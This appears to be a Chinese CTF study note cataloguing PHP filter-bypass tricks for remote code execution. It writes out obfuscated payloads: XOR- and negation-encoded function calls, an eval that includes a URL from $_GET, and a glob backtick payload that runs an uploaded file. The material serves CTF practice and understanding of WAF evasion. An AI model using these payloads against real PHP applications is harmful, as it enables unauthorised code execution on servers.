tags:: CTF/RCE, CTF/PHP/WAF绕过， CTF/PHP/无字母数字RCE

- `'`
	- `"`
- `base_convert`
	- `chr` 拼接
- 空格和括号
	- `eval('include$_GET[url]?>');`
- hex
	- php的`"`支持转义: `"\x61"`
- 和，或，非等二进制操作
	- 异或
	- `((%fe%fe%fe%fe%fe%fe%fe)^(%8e%96%8e%97%90%98%91))();`
	- 取反
	- `${~'%99%93%9E%98'} # $flag`
- `$$`
	- ```php
	  $a = "b"
	  $b = "asd"
	  echo($$a) // 输出asd
	  ```
- glob
	- ```
	  `?><?=`. /???/????????[@-[]`?>`	
	  ```
	- 需要配合文件上传,具体见[[CTF/PHP/无字母数字RCE]]
#### 从其他地方读取
	- 其他未被过滤的参数(GET 或者 POST)
	- session_id()
	- cookie
	- log
- [[CTF/PHP/无字母数字RCE]]